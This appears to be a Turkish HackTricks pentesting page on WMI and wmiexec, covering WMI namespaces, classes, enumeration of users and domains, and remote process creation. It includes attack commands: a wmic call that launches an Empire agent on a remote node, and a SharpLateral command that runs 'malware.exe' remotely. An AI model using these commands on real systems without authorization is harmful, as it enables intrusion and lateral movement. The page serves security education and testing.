# WmicExec

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com)'ni edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Nasıl Çalıştığı Açıklaması

Kullanıcı adı ve ya şifre veya hash bilinen ana bilgisayarlarda WMI kullanılarak işlemler açılabilir. Wmiexec tarafından WMI kullanılarak komutlar yürütülür ve yarı etkileşimli bir kabuk deneyimi sağlanır.

**dcomexec.py:** Farklı DCOM uç noktalarını kullanarak, bu betik wmiexec.py'ye benzer yarı etkileşimli bir kabuk sunar, özellikle ShellBrowserWindow DCOM nesnesini kullanır. Şu anda MMC20'yi destekler. Uygulama, Shell Windows ve Shell Browser Window nesneleri. (kaynak: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI Temelleri

### Ad Alanı

Dizin tarzında bir hiyerarşiye sahip olan WMI'nın en üst düzey konteyneri \root'dur, altında ad alanları olarak düzenlenen ek dizinler bulunur.
Ad alanlarını listelemek için komutlar:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Bir namespace içindeki sınıflar şu şekilde listelenebilir:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Sınıflar**

Bir WMI sınıf adını, örneğin win32\_process, ve bulunduğu ad alanını bilmek herhangi bir WMI işlemi için hayati öneme sahiptir.
`win32` ile başlayan sınıfları listelemek için komutlar:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Sınıfın çağrılması:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Yöntemler

Yöntemler, WMI sınıflarının bir veya daha fazla yürütülebilir işlevini temsil eder ve çalıştırılabilir.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Numaralandırma

### WMI Servisi Durumu

WMI servisinin çalışır durumda olup olmadığını doğrulamak için kullanılan komutlar:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Sistem ve İşlem Bilgileri

WMI aracılığıyla sistem ve işlem bilgilerini toplama:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Saldırganlar için, WMI sistemler veya alanlar hakkında hassas verileri sıralamak için güçlü bir araçtır.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
### **Elle Uzaktan WMI Sorgulama**

Uzaktan belirli bilgilere, örneğin yerel yöneticilere veya oturum açmış kullanıcılara WMI üzerinden sorgu yapmak, dikkatli komut oluşturma ile mümkündür.

Uzaktan bir makinedeki yerel yöneticileri gizlice tanımlamak ve oturum açmış kullanıcıları belirlemek belirli WMI sorguları aracılığıyla gerçekleştirilebilir. `wmic`, ayrıca birden fazla düğümde komutları aynı anda yürütmek için bir metin dosyasından okumayı da destekler.

WMI üzerinden bir işlemi, örneğin bir Empire ajanı dağıtmayı uzaktan yürütmek için aşağıdaki komut yapısı kullanılır ve başarılı yürütme "0" dönüş değeri ile gösterilir:
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Bu süreç, WMI'ın uzaktan yürütme ve sistem numaralandırma yeteneklerini göstererek, hem sistem yönetimi hem de penetrasyon testi için kullanışlılığını vurgular.


## Referanslar
* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Otomatik Araçlar

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
{% endcode %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'da **takip edin**.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
